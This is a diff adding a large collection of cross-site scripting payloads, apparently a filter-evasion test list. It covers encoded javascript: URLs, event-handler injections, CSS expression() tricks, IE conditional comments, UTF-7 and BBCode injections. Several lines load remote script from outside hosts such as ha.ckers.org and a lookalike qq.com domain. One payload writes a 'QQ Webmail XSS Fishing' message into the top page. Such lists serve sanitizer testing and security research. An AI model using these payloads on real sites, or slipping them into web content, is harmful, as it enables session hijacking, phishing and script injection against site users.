@@ -1,0 +1,304 @@
+<img src="javascript:alert(/img_1/)">
+<img src="#"/**/onerror=alert(/img_2/)>
+<img src="vbscript:msgbox(/img_3/)">
+<img src="vBs	cript:msgbox(/img_4/)">
+<img src="javascr	ipt:alert(/img_5/)">
+<img src="vbsc&#x09;ript:msgbox(/img_6/)">
+<img src=&#38;&#35;&#49;&#48;&#54;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#53;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#48;&#53;&#59;&#38;&#35;&#49;&#49;&#50;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#53;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#48;&#56;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;&#38;&#35;&#53;&#50;&#59;&#38;&#35;&#53;&#55;&#59;&#38;&#35;&#52;&#49;&#59;&#38;&#35;&#53;&#57;&#59;>>
+<img src=&{alert(/img_8/);};>
+<img src="mocha:alert(/img_9/)"> 
+onmouseover<img src="blah"onmouseover="alert(/img_10/)">
+onmouseover<img src="blah>" onmouseover="alert(/img_11/)">
+<img dynsrc="javascript:alert(/img_12/)"> 
+<img src="j&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#53;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#48;&#53;&#59;&#38;&#35;&#49;&#49;&#50;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#53;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#48;&#56;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;&#38;&#35;&#51;&#57;&#59;&#38;&#35;&#57;&#56;&#59;&#38;&#35;&#49;&#50;&#49;&#59;&#38;&#35;&#51;&#50;&#59;&#38;&#35;&#50;&#50;&#56;&#57;&#57;&#59;&#38;&#35;&#50;&#57;&#57;&#56;&#51;&#59;&#38;&#35;&#50;&#52;&#49;&#56;&#57;&#59;&#38;&#35;&#50;&#52;&#49;&#56;&#57;&#59;&#38;&#35;&#50;&#57;&#50;&#53;&#54;&#59;&#38;&#35;&#51;&#50;&#59;&#38;&#35;&#50;&#54;&#50;&#56;&#54;&#59;&#38;&#35;&#51;&#56;&#54;&#51;&#50;&#59;&#38;&#35;&#50;&#56;&#52;&#56;&#55;&#59;&#38;&#35;&#50;&#56;&#52;&#56;&#55;&#59;&#38;&#35;&#51;&#50;&#59;&#38;&#35;&#51;&#50;&#59;&#38;&#35;&#56;&#49;&#59;&#38;&#35;&#56;&#49;&#59;&#38;&#35;&#53;&#56;&#59;&#38;&#35;&#53;&#48;&#59;&#38;&#35;&#53;&#53;&#59;&#38;&#35;&#52;&#56;&#59;&#38;&#35;&#53;&#53;&#59;&#38;&#35;&#52;&#56;&#59;&#38;&#35;&#53;&#49;&#59;&#38;&#35;&#53;&#54;&#59;&#38;&#35;&#53;&#48;&#59;&#38;&#35;&#52;&#50;&#59;&#38;&#35;&#51;&#57;&#59;&#38;&#35;&#52;&#49;&#59;">
+  <img src=j&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#98;&#121;&#32;&#22899;&#29983;&#24189;&#24189;&#29256;&#32;&#26286;&#38632;&#28487;&#28487;&#32;&#32;&#81;&#81;&#58;&#50;&#55;&#48;&#55;&#48;&#51;&#56;&#50;&#42;&#39;&#41;>
+<img src="" x=x"onerror="alert(/img_15/)">
+<img src="" x=x"'onerror="alert(/img_16/)"/>
+<img src="" x="x"\/onerror="alert(/img_17/)"/>
+look at top.document</div><img src"" x=`<img src="" onerror="top.document.write('QQ Webmail XSS Fishing');">
+<IMG SRC="jav&#x09;ascript:alert(/img_19/);"> 
+<IMG SRC="jav&#x0A;ascript:alert(/img_20/);"> 
+<IMG SRC="jav&#x0D;ascript:alert(/img_21/);">
+<IMG SRC=`javascript:alert(/img_22/)`>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;15&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000049&#0000054&#0000039&#0000041>
+<img src="vbsc&#x09;ript:msgbox(/img_25/)">
+<IMG SRC="jav
+ascript:alert(/img_26/);">
+<IMG SRC=" &#14;  javascript:alert(/img_27/);">
+<IMG DYNSRC="javascript:alert(/img_28/)">
+<IMG LOWSRC="javascript:alert(/img_29/)">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>
+<IMG SRC=`javascript:alert("RSnake says, 'img_31'")`>
+<IMG SRC="jav&#x0A;ascript:alert(/img_32/);">
+<IMG SRC=" &#14;  javascript:alert(/img_33/);">
+<IMG height=14 src=http://xxx.jpg onload="alert(/img_34/)" width=307>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.0x54.org/lake2/xss/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(/param_1/)></OBJECT>
+<a href="javascript:alert(/a_3/)">click me 3</a>
+<marquee onstart="alert(/marquee_1/);">good good eat</marquee>
+firefox: <xml id="X"><a><b><script>alert(/xml_2/)</script>;</b></a></xml>
+ie6: <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(/xml_1/);">]]>
+</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+ie6: <STYLE>.XSS{background-image:url("javascript:alert(/style_6/)");}</STYLE><A CLASS=XSS></A>
+<textarea onchange="alert(/textarea_1/)">Change me!</textarea>
+<EMBED SRC="http://www.0x54.org/lake2/xss/openwindow.swf"></EMBED>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always">xxx</EMBED>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<iframe src="http://www.baidu.com"  width="400"  hight="400">
+ie 6:<STYLE ONLOaD="top.document.write(/you should not see me!!!!!style_2/)"> </div> </STYLE>
+ie6:<STYLE onload="top.document.write(/you should not see me!!!!!style_1/)"> </div> </STYLE>
+ie 6:<style onreadystatechange=alert(/style_3/)></style>
+ie6: <BODY BACKGROUND="javascript:alert(/body_3/)"></body>
+<body onunload="alert(/body_2/)">Close the window, you will see me</body>
+<body onload="alert(/body_1/)">haah</body>
+<IMG """><SCRIPT>alert(/script_1/)</SCRIPT>">
+<<<SCRIPT>alert(/script_2/);//<</SCRIPT>
+<!--[if gte IE 4]><SCRIPT>alert(/script_3/);</SCRIPT><![endif]-->
+<SCRIPT///SRC="http://ha.ckers.org/xss.js"//></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<script>alert(&quot;script_4&quot;)</script>
+%3cscript%3ealert(/script_5/)%3c/script%3e
+<script>alert(/script_6/)</script>
+<scr<script//>alert(/script_7/);</script>
+&<script>alert(/script_8/)</script>
+<style><!--</style><script>alert(/script_9/)//--></script>
+<![CDATA[<!--]]><script>alert(/script_10/)//--></script>
+<!-- -- --><script>alert("/script_11/")</script><!-- -- -->
+<xml id="X"><a><b><script>alert(/script_12/)</script>;</b></a></xml>
+<a href="about:<script>alert(/script_13/)</script>"></a>
+[\xC0][\xBC]script>alert(/script_14/)[\xC0][\xBC]/script>
+<! --[if ie]>
+<script>alert(/script_15/)</script>
+<! [endif]-->
+<! -- [ if ie]>
+<script>alert(/script_16/)</script>
+<! [ endif]-->
+<! -- [ if IE ] ><!--> <script>alert(/script_28/)</script> <! -- <! [ endif ] -- >
+<!--[if IE]><!--> <script>alert(/script_29/)</script> <!--<![endif]-->
+<comment><script>alert(/script_30/);</script></comment>
+  sss<script>alert(/script_31/);</script>
+</script>sss<scr<script//>alert(/script_32/);</script>
+<style><!--</style><script src=somecode.js>alert('/script_33/')//--></script>
+<!--[if IE]><script>alert(/script_17/)</script><![endif]-->
+<![if !IE]><![endif]>
+<!--[if IE 7]><script>alert(/script_18/)</script><![endif]-->
+<!--[if !(IE 7)]><script>alert(/script_19/)</script><![endif]-->
+<!--[if gte IE 7]><script>alert(/script_20/)</script><![endif]-->
+<!--[if (IE 5)]><script>alert(/script_21/)</script><![endif]-->
+<!--[if (gte IE 5.5)&(lt IE 7)]><script>alert(/script_22/)</script><![endif]-->
+<!--[if lt IE 5.5]><script>alert(/script_23/)</script><![endif]-->
+<!--[if true]><script>alert(/script_24/)</script><![endif]-->
+<![if false]><script>alert(/script_25/)</script><![endif]>
+<!--[if true]><![if IE 7]><script>alert(/script_26/)</script><![endif]><![endif]-->
+<!--  [   if    true]><![if IE 7]><script>alert(/script_27/)</script><![endif]><![endif]-->
+ie6: <DIV STYLE="width: expression(alert(/style_17/));">ren sheng da qi da luo, shi zai tai ci ji le</DIV>
+ie6: <IMG STYLE="xss:expr/*XSS*/ession(alert(/style_18/))">
+ie6: <XSS STYLE="xss:expression(alert(/style_19/))">
+ie6: exp/*<A STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(/style_20/))'>ie6: <STYLE>li {list-style-image: url(javascript:alert(/style_5/));}</STYLE><UL><LI>
+ie6: <INPUT TYPE="IMAGE" SRC="javascript:alert(/input_1/);">
+ff2: <INPUT onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(/input_2/)>
+ie6: <input type="image" dynsrc="javascript:alert(/input_3/)"> 
+ie6:<STYLE>@im\port'\ja\vasc\ript:alert(/style_0/)';</STYLE>
+ff3: <style><!--</style><script>alert(/sytle_4/)//--></script>
+ie6:<STYLE type="text/css">BODY{background:url("javascript:alert(/style_7/)")}</STYLE>
+ie6(style_8): /**/<xss/**/style=xss:express/**/ion(eval("\x69\x66\x28\x77\x69\x6e\x64\x6f\x77\x2e\x61\x21\x3d\x31\x29\x7b\x61\x6c\x65\x72\x74\x28\x2f\x73\x74\x79\x6c\x65\x5f\x38\x2f\x29\x3b\x77\x69\x6e\x64\x6f\x77\x2e\x61\x3d\x31\x3b\x7d"))>/**/
+ie6(style_9): /**/<xss/**/style=xss:expr/**/ession(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,98,33,61,49,41,123,97,108,101,114,116,40,47,115,116,121,108,101,95,57,47,41,59,119,105,110,100,111,119,46,98,61,49,59,125)))>/**/
+ie6(style_10): <LINK REL="stylesheet" HREF="javascript:alert(/style_10/);">
+ie6(style_11): <div style="xss:ex/**/pre/**/ss/**/ion(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,99,33,61,49,41,123,97,108,101,114,116,40,47,115,116,121,108,101,95,49,49,47,41,59,119,105,110,100,111,119,46,99,61,49,59,125)))">
+ie6: <div style="background-color:red" onmouseenter="alert(/style_12/)">onmouseenter</div>
+ie6: <DIV onmouseleave="alert(/style_13/)" style="BACKGROUND-COLOR: green">onmouseleave</DIV>
+ie6(style_14): </xss style="x:expression(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,100,33,61,49,41,123,97,108,101,114,116,40,47,115,116,121,108,101,95,49,52,47,41,59,119,105,110,100,111,119,46,100,61,49,59,125)))">
+ie 6(xss):<LINK REL="stylesheet" HREF="http://www.0x54.org/lake2/xss/xss.css">
+xss.css:
+body {
+  background-image: url('javascript:alert("LINK XSS");')
+}
+____
+ie 6:<DIV STYLE="background-image: url(javascript:alert(/sytle_15/))">Your voice is a shit!</DIV>
+ie6: <DIV STYLE="background-image: url(&#1;javascript:alert(/style_16/))">Guan na~ zhe jiu shi guan na~~</DIV>
+ie6(style_21): <DIV STYLE="background-image:\0075\0072\006c\0028\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\000a\000a\002f\0073\0074\0079\006c\0065\005f\0032\0031\002f\0029\0029">ru ci la feng de ren</DIV>
+ie6(a.js is only an alert(style_23)): <div style="behavior: url(http://www.a.com/js/a.js);"> 
+</TITLE><SCRIPT>alert("title_1");</SCRIPT>
+ie6(style_22): <P STYLE="behavior:url('#default#time2')" onEnd="alert('style_22')">)<FRAMESET><FRAME SRC="javascript:alert(/frame_1/);"></FRAME></FRAMESET>
+<iframe src="vbscript:msgbox('/frame_2/')">
+[img]x" onerror="alert(2);[/img]
+[img=x" onerror="alert(3);]
+[img]x onerror="alert(4);"[/img]
+[img=x onerror="alert(5);"]
+[img]x' onerror='alert(6);[/img]
+[img=x' onerror='alert(7);]
+[url="></a><script>alert(8);</script>]
+[url]"></a><script>alert(9);</script>[/url]
+[url=" onmouseover="alert(10);]
+[url]" onmouseover="alert(11);[/url]
+<div  onmousedown="alert('1a')"><h3>onmousedown ME 1a</h3></div>
+<div  onclick="alert('1b')"><h3>onclick ME 1b</h3></div>
+<div  ondblclick="alert('1c')"><h3>ondbclick ME 1c</h3></div>
+<div  onmousemove="alert('1d')"><h3>onmousemove ME 1d</h3></div>
+<div  onmouseover="alert('1e')"><h3>onmouseover ME 1e</h3></div>
+<div  onmouseout="alert('1f')"><h3>onmouseout ME 1f</h3></div>
+<div  onmouseup="alert('1g')"><h3>onmouseup ME 1g</h3></div>
+<div  onkeydown="alert('1h')"><input value="onkeydown h"></div>
+<div  onkeypress="alert('1i')"><input value="onkeypress i"></div>
+<div  onkeyup="alert('1j')"><input value="onkeyup j"></div>
+<img src='#'><script>alert('img1')</script>
+<EMBED src='#'><script>alert('embed1')</script>
+<EMBED src='#'><script>alert('embed2')</script></EMBED>
+<COMMENT><script>alert('COMMENT1')</script></COMMENT>
+<COMMENT><script>alert('COMMENT2')</script>
+<XML><script>alert('XML1')</script></XML>
+<XML><script>alert('XML2')</script>
+<LAYER><script>alert('LAYER1')</script></LAYER>
+<LAYER><script>alert('LAYER2')</script>
+<METAAPPLET><script>alert('METAAPPLET1')</script></METAAPPLET>
+<METAAPPLET><script>alert('METAAPPLET2')</script>
+<FRAME><script>alert('FRAME1')</script></FRAME>
+<FRAME><script>alert('FRAME2')</script>
+<SCRIPT><script>alert('SCRIPT1')</script></SCRIPT>
+<SCRIPT><script>alert('SCRIPT2')</script>
+<STYLE><script>alert('STYLE1')</script></STYLE>
+<STYLE><script>alert('STYLE2')</script>
+<PLAYER><script>alert('PLAYER1')</script></PLAYER>
+<PLAYER><script>alert('PLAYER2')</script>
+<TITLE><script>alert('TITLE1')</script></TITLE>
+<TITLE><script>alert('TITLE2')</script>
+<BASE><script>alert('BASE1')</script></BASE>
+<BASE><script>alert('BASE2')</script>
+<LINK><script>alert('LINK1')</script></LINK>
+<LINK><script>alert('LINK2')</script>
+<IFRAME><script>alert('IFRAME1')</script></IFRAME>
+<IFRAME><script>alert('IFRAME2')</script>
+<INPUT><script>alert('INPUT1')</script></INPUT>
+<INPUT><script>alert('INPUT2')</script>
+<BGSOUND><script>alert('BGSOUND1')</script></BGSOUND>
+<BGSOUND><script>alert('BGSOUND2')</script>
+<ILAYER><script>alert('ILAYER1')</script></ILAYER>
+<ILAYER><script>alert('ILAYER2')</script>
+<FRAMESET><script>alert('FRAMESET1')</script></FRAMESET>
+<FRAMESET><script>alert('FRAMESET2')</script>
+<BODY><script>alert('BODY1')</script></BODY>
+<BODY><script>alert('BODY2')</script>
+<HEAD><script>alert('HEAD1')</script></HEAD>
+<HEAD><script>alert('HEAD2')</script>
+<FORM><script>alert('FORM1')</script></FORM>
+<FORM><script>alert('FORM2')</script>
+<TEXTAREA><script>alert('TEXTAREA1')</script></TEXTAREA>
+<TEXTAREA><script>alert('TEXTAREA2')</script>
+<DOCTYPE><script>alert('DOCTYPE1')</script></DOCTYPE>
+<DOCTYPE><script>alert('DOCTYPE2')</script>
+<HTML><script>alert('HTML1')</script></HTML>
+<HTML><script>alert('HTML2')</script>
+<SCRIPT ="><\/script>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="><\script>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="><script>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script>alert(&quot;XSS&quot;)</script>
+<table background="javascript:alert(0)"></table>
+<table><td background="javascript:alert(1)"></td></table>
+<img src="javascript:alert(2)">
+<img src="#"/**/onerror=alert(3)>
+%3cscript%3ealert(4)%3c/script%3e
+<img src="vbscript:msgbox(5)">
+/**/<xss/**/style=xss:express/**/ion(eval("\x69\x66\x28\x77\x69\x6e\x64\x6f\x77\x2e\x61\x21\x3d\x31\x29\x7b\x61\x6c\x65\x72\x74\x28\x36\x29\x3b\x77\x69\x6e\x64\x6f\x77\x2e\x61\x3d\x31\x3b\x7d"))>/**/
+/**/<xss/**/style=xss:expr/**/ession(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,98,33,61,49,41,123,97,108,101,114,116,40,55,41,59,119,105,110,100,111,119,46,98,61,49,59,125)))>/**/
+<img src="vBs	cript:msgbox(8)">
+<img src="javascr	ipt:alert(9)">
+<IMG SRC="jav&#x09;ascript:alert(10);"> 
+<IMG SRC="jav&#x0A;ascript:alert(11);"> 
+<IMG SRC="jav&#x0D;ascript:alert(12);">
+<BODY BACKGROUND="javascript:alert(13)"></body>
+<IMG SRC=`javascript:alert(14)`>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;15&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000049&#0000054&#0000039&#0000041>
+<img src="vbsc&#x09;ript:msgbox(17)">
+<IMG SRC="jav
+ascript:alert(18);">
+<IMG SRC=" &#14;  javascript:alert(19);">
+<IMG DYNSRC="javascript:alert(20)">
+<IMG LOWSRC="javascript:alert(21)">
+<LINK REL="stylesheet" HREF="javascript:alert(22);">
+<STYLE>li {list-style-image: url(javascript:alert(23));}</STYLE><UL><LI>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(24);">
+<IFRAME SRC="javascript:alert(25);"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(26);"></FRAMESET>
+<DIV STYLE="background-image: url(javascript:alert(27))">Your voice is a shit!</DIV>
+<DIV STYLE="background-image: url(&#1;javascript:alert(28))">Guan na~ zhe jiu shi guan na~~</DIV>
+<DIV STYLE="width: expression(alert(29));">ren sheng da qi da luo, shi zai tai ci ji le</DIV>
+<STYLE>@im\port'\ja\vasc\ript:alert(30)';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert(31))">
+<XSS STYLE="xss:expression(alert(32))">
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(33))'>
+<STYLE>.XSS{background-image:url("javascript:alert(34)");}</STYLE><A CLASS=XSS></A>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(35)></OBJECT>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(36);">]]>
+</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(37);">
+<STYLE type="text/css">BODY{background:url("javascript:alert(38)")}</STYLE>
+<div style="xss:ex/**/pre/**/ss/**/ion(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,99,33,61,49,41,123,97,108,101,114,116,40,51,57,41,59,119,105,110,100,111,119,46,99,61,49,59,125)))">
+<DIV STYLE="background-image:\0075\0072\006c\0028\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0034\0030\0029\0029">ru ci la feng de ren</DIV>
+<marquee onstart="alert(41);">good good eat</marquee>
+<div style="background-color:red" onmouseenter="alert(42)">onmouseenter</div>
+<DIV onmouseleave="alert(43)" style="BACKGROUND-COLOR: green">onmouseleave</DIV>
+<body onunload="alert(44)">onunload</body>
+<HTML><BODY>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="script&lt;SCRIPT DEFER&gt;alert(&quot;45&quot;)&lt;/SCRIPT&gt;">
+</BODY></HTML>
+<div style="{ left:e£ø£ð£ò£å£ó£ó£é£ïn( alert(46) ) }">quan jiao</div>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(47);+ADw-/SCRIPT+AD4-
+\x3cscript\x3ealert(48)\x3c\x2fscript\x3e
+<img src=&#38;&#35;&#49;&#48;&#54;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#49;&#53;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#48;&#53;&#59;&#38;&#35;&#49;&#49;&#50;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#53;&#56;&#59;&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#48;&#56;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;&#38;&#35;&#53;&#50;&#59;&#38;&#35;&#53;&#55;&#59;&#38;&#35;&#52;&#49;&#59;&#38;&#35;&#53;&#57;&#59;>>
+<!--[if ie]>
+<script>alert(50)</script>
+<![endif]-->
+51:P </xss style="x:expression(eval(String.fromCharCode(105,102,40,119,105,110,100,111,119,46,100,33,61,49,41,123,97,108,101,114,116,40,53,49,41,59,119,105,110,100,111,119,46,100,61,49,59,125)))">
+<isindex src=1 onerror=alert(52)>
+click Me<isindex action=javascript:alert(53) type=image>
+<scr<script//>alert(60);</script>
+<img orgsrc="javascript:alert('61')" src="javascript:alert('61')">
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<table background=javascript:alert(62)>
+<table background=javascript&#14848:alert(63)>
+<table background=javascript&#14848&#14848&#14848&#14848&#14848:alert(64)>
+<video src=1 onerror=alert(65)>
+<audio src=1 onerror=alert(66)>
+<img src="x onerror=alert(67)//[^"]* 
+<a href='data:text/xml,<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html [ <!ENTITY inject "&#60;script&#62;alert(1)&#60;/script&#62;">]><html xmlns="http://www.w3.org/1999/xhtml">&inject;</html>'>haha</a>
+<div style="xss:expression(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="\0078\0073\0073:\0065\0078\0070\0072\0065\0073\0073\0069\006f\006e(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="\0078 \0073 \0073: \0065 \0078 \0070 \0072 \0065 \0073 \0073 \0069 \006f \006e(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="xss:\000065\000078\00070\00072\00065\000073\00073\00069\0006f\006e(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="xs\0s:e\x\pression\(window.x?0:(alert(/XSS/),window.x=1)\);"></div>
+<div style="\0078\0073\0073:\0065&#65279;\0078&#65279;\0070&#65279;\0072&#65279;\0065&#65279;\0073&#65279;\0073&#65279;\0069&#65279;\006f&#65279;\006e&#65279;(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="\0078\0073\0073&#62&#58&#92&#48&#48&#54&#53&#92&#48&#48&#55&#56&#92&#48&#48&#55&#48&#92&#48&#48&#55&#50&#92&#48&#48&#54&#53&#92&#48&#48&#55&#51&#92&#48&#48&#55&#51&#92&#48&#48&#54&#57&#92&#48&#48&#54&#102&#92&#48&#48&#54&#101(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<div style="\0000000000078\0000000000073s:e&#x5c;&#x78;p/*tbeorhf*/ression(window.x?0:(alert(/XSS/),window.x=1));"></div>
+Encoded comments:-
+<div style="xss:ex&#47;&#42;&#79;&#77;&#71;&#42;&#47;pression(window.x?0:(alert(/XSS/),window.x=1));"></div>
+<?xml version="1.0" encoding="utf-7"?>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4- 
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<EMBED SRC="http://www.0x54.org/lake2/xss/openwindow.swf"></EMBED>
+<iframe src="http://www.baidu.com" width="100"  hight="100">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.0x54.org/lake2/xss/scriptlet.html"></OBJECT>
+<img src="http:x" alt='"x=1' name=onerror='alert(68)'></img>
+<img src="http:x" alt='"x=2' name="src=onerror='alert(69)'"></img>
+<img src="http:x" alt='"x=3' name='"src=onerror='alert(70)'"'></img>
+<img src="http:x" alt='"x=4' name='" src=javascript:alert(71)'"'></img>
+<img src="http:x" alt='"x=5' name='" src="javascript:alert(72)'"'></img>
+<img src="http:x" alt='x=8' name='" src="javascript:alert(73)'"'></img>
+<img src="http:x" alt='"x=6' name='" src='"javascript:alert(74)'"'></img>
+<img src="http:x" alt='"x=7' name='" src='javascript:alert(75)'"'></img>
+<img name='" src="javascript:alert(75)'"'></img>
+<img src="http:x" name='" src="javascript:alert(77)'"'></img>
+<scr&#105pt type="text/javascript"/>document.write("<scr"+"ipt src="http://imgcache.qq.com.suqian114.cn/a/q/j.php" type="text/javascript"/></SC"+"RIPT>")</a> <a style="" target="_blank"></a> <a name="mp3.baidu.com" style="{background:url(#)}" target="_blank"></a> 
